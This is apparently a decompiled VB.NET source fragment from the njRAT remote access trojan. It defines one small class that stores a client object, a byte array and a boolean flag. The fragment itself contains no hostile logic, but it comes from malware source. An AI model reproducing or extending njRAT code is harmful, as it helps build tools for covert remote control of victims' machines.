﻿Imports System

Namespace NJRAT
	' Token: 0x0200002E RID: 46
	Public NotInheritable Class GClass12
		' Token: 0x0600058E RID: 1422 RVA: 0x001427F4 File Offset: 0x00140BF4
		Public Sub New(client_1 As Client, byte_1 As Byte())
			Me.bool_0 = False
			Me.client_0 = client_1
			Me.byte_0 = byte_1
		End Sub

		' Token: 0x040002D2 RID: 722
		Public bool_0 As Boolean

		' Token: 0x040002D3 RID: 723
		Public byte_0 As Byte()

		' Token: 0x040002D4 RID: 724
		Public client_0 As Client
	End Class
End Namespace
